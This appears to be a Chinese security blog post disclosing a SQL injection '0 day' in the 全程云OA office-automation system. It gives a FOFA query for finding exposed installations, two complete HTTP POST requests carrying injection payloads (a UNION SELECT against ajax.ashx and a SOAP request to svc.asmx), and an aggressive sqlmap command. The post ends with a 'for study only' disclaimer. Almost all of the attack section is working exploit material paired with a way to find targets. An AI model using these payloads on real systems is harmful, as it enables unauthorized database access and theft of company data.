#  【0 day】全程云OA SQL注入漏洞   
原创 安全透视镜  网络安全透视镜   2024-01-07 19:51  
  
**一、漏洞描述**  
  
系统介绍  
  
全程云OA为企业提供日常办公管理、公文管理、工作请示、汇报、档案、知识体系、预算控制等26个功能，超过100多个子模块。为企业内部提供高效、畅通的信息渠道，同时也能大力推动公司信息系统发展，提高企业的办公自动化程度和综合管理水平，加快企业信息的流通，提高企业市场竞争能力。  
  
该系统多个接口存在SQL注入漏洞，通过此漏洞攻击者可获取数据库权限，威胁企业数据安全；  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5VicpWUzRgu8aEllfJMB6xxUa25UM1ZvvfJ2U6FF6BpKovJCxxicIYUQ6nlwGicTCZV7IoFehcUtic1Q/640?wx_fmt=png&from=appmsg "")  
  
  
**二、网络空间搜索引擎搜索**  
  
  
fofa查询  
```
"全程云OA" || "images/yipeoplehover.png"
```  
  
  
**三、漏洞复现**  
  
ajax.ashx 注入  
```
POST /OA/common/mod/ajax.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 206

dll=DispartSell_Core.dll&class=DispartSell_Core.BaseData.DrpDataManager&method=GetProductById&id=1 UNION ALL SELECT 1,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 -- A

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5VicpWUzRgu8aEllfJMB6xx8d2CDAnrMDaqyNnLiah8Dj4eiccmFfJerCsWENXFzJaGQpQiawFibiafBsw/640?wx_fmt=png&from=appmsg "")  
  
  
svc.asmx 注入  
```
POST /oa/pm/svc.asmx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: ASP.NET_SessionId=svwjdwbhl4lv00iqktjh5url
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: text/xml; charset=utf-8
Content-Length: 511
SOAPAction: "http://tempuri.org/GetUsersInfo"

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">  <soap:Body>    <GetUsersInfo xmlns="http://tempuri.org/">      <userIdList>*
</userIdList>    </GetUsersInfo>  </soap:Body></soap:Envelope>

```  
  
  
sqlmap 注入  
```
python  sqlmap.py  -r post.txt --batch --level 4 --risk 3
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5VicpWUzRgu8aEllfJMB6xxkib6Wa455YTJHcmD4V64n4RjrnNH0RVTfyH7ib8sgO8S0LWIxGj6aR8A/640?wx_fmt=png&from=appmsg "")  
  
  
**四、漏洞检测**  
  
pocsuite3 漏洞检测  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5VicpWUzRgu8aEllfJMB6xxN2mMLQ6IAeibR7hLKsYclW8qygVQNUPPNpYEQqyQPgALAZThCnVicxNA/640?wx_fmt=png&from=appmsg "")  
# 文章来源互联网收集整理，请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5bU6uhMX5jh36Q87KR0HDibicicWMKRQogIa5uDmcntAKg8pgsicJXpWnGQbsVytkqrzcaqN7tQtXgBA/640?wx_fmt=png&from=appmsg "")  
  
****  
  
